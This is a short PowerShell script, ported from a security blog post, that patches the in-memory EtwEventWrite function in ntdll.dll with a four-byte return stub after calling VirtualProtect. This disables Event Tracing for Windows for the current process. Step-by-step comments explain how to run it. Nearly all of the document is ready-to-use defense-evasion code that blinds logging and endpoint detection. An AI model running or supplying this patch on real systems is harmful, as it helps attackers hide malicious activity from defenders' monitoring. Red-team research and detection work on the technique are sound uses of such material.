
# Ported from: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/

# 1. Open PowerShell_ISE via c:\Windows\system32\windowspowerShell\v1.0\powershell_ise.exe.
# 2. Run the commands below to block ETW. Be aware that this only works for x86.

# Setup native functions so they can be called through c#
$win32 = @"
using System.Runtime.InteropServices;
using System;

public class Win32 {

[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

# Add the type so the c# functions can be called through PowerShell
Add-Type $win32

# Get a pointer to the memory address where the ntdll.dll EtwEventWrite function is loaded in the current process
# https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
$address = [Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"), "EtwEventWrite")

# Create a byte array that will be used to overwrite (hotpatch) the dll in memory identified by @_xpn_.
$oldProtect = 0
$b2 = 0
$hook = New-Object Byte[] 4
$hook[0] = 0xc2; 
$hook[1] = 0x14; 
$hook[2] = 0x00; 
$hook[3] = 0x00; 

# Set the memory page as writable - PAGE_EXECUTE_READWRITE
# https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
# 0x01 PAGE_NOACCESS
# 0x02 PAGE_READONLY
# 0x10 PAGE_EXECUTE
# 0x20 PAGE_EXECUTE_READ
# 0x40 PAGE_EXECUTE_READWRITE
# 0x80 PAGE_EXECUTE_WRITECOPY
[Win32]::VirtualProtect($address, [UInt32]$hook.Length, 0x40, [Ref]$oldProtect)

# Start and the ntdll.dll prt location and overwrite memory with the 4 bytes array to block etw
[System.Runtime.InteropServices.Marshal]::Copy($hook, 0, $address, [UInt32]$hook.Length)

# Restore setting
[Win32]::VirtualProtect($address, [UInt32]$hook.Length, $oldProtect, [Ref]$b2)
